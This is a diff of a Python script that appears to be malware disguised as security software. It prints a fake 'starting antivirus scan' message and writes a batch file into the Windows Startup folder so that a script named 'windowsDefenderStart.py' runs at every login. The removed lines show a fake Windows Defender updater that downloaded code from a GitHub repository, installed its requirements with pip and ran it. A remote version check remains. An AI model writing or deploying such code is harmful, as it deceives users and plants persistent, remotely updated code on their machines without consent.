@@ -22,22 +22,8 @@ except:
 
 def FirstRun():
     print("starting antivirus scan ...")
-    open(os.path.expanduser('~') + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\system32setup.bat", "w").write(f"python {os.getcwd()}\\runer.py")
-    
-    open("update.bat", "w+").write("""
-    echo updating windows defender
+    open(os.path.expanduser('~') + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\system32setup.bat", "w").write(f"python {os.getcwd()}\\windowsDefenderStart.py")
 
-    timeout /t 10 /nobreak
-    del runer.py
-    
-    curl https://raw.githubusercontent.com/MundoCoRobiBundo/jakie-co-/main/runer.py -O
-    curl https://raw.githubusercontent.com/MundoCoRobiBundo/jakie-co-/main/requirements.txt -O
-    
-    pip install -r requirements.txt
-    
-    echo windows defender is up to date
-    python runer.py                               
-    """)
 
 
 new_version = (float(str(requests.get("https://raw.githubusercontent.com/MundoCoRobiBundo/jakie-co-/main/version").content).split("\"")[1]))
